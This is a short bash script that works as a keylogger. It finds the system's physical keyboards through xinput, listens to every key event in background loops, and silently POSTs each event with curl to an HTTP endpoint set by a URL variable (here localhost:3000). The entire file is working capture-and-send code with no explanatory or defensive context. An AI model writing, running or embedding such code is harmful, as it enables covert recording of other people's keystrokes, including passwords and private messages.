#!/bin/bash

URL='http://localhost:3000'

getkbds() {
	xinput list | grep -i keyboard | grep -vi virtual | cut -d= -f2 | cut -f1
}

for i in $(getkbds); do
	xinput test "$i" | while read -r p; do curl --data "$p" "$URL" &>/dev/null; done &
done
